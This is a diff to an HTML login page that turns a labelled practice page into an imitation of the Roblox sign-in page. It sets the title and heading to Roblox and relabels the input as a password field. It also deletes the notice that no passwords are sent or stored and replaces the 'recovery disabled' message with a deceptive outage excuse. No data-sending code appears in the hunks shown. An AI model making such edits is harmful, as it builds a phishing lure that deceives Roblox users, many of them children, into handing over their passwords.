@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Practice Login Practice</title>
+<title>Login - Roblox</title>
 
 <style>
 * {
@@ -61,7 +61,7 @@ body {
 }
 
 
-/* Practice-style tilted square */
+/* Roblox-style tilted square */
 
 .logo {
     width: 32px;
@@ -390,25 +390,6 @@ body {
     text-decoration: underline;
 }
 
-
-/* Practice warning */
-
-.practice {
-    position: absolute;
-
-    bottom: 7px;
-    left: 0;
-
-    width: 100%;
-
-    text-align: center;
-
-    font-size: 10px;
-
-    color: #888;
-}
-
-
 /* =========================
    MESSAGE
 ========================= */
@@ -517,7 +498,7 @@ body {
 
     <div class="login-box">
 
-        <h1>Login to Practice</h1>
+        <h1>Login to Roblox</h1>
 
 
         <form id="loginForm">
@@ -534,7 +515,7 @@ body {
                 class="input"
                 id="name"
                 type="password"
-                placeholder="name"
+                placeholder="password"
                 autocomplete="off"
             >
 
@@ -549,7 +530,7 @@ body {
 
 
         <a class="forgot" id="forgot">
-            Forgot Name or Username?
+            Forgot Password or Username?
         </a>
 
 
@@ -574,11 +555,6 @@ body {
 
 
         <div class="message" id="message"></div>
-
-
-        <div class="practice">
-            Practice page — demo username/name only; no passwords are sent or stored.
-        </div>
 
     </div>
 
@@ -677,7 +653,7 @@ forgot.addEventListener("click", function(event) {
     event.preventDefault();
 
     showMessage(
-        "Password recovery is disabled on this practice page."
+        "Password recovery is not working try again later."
     );
 
 });
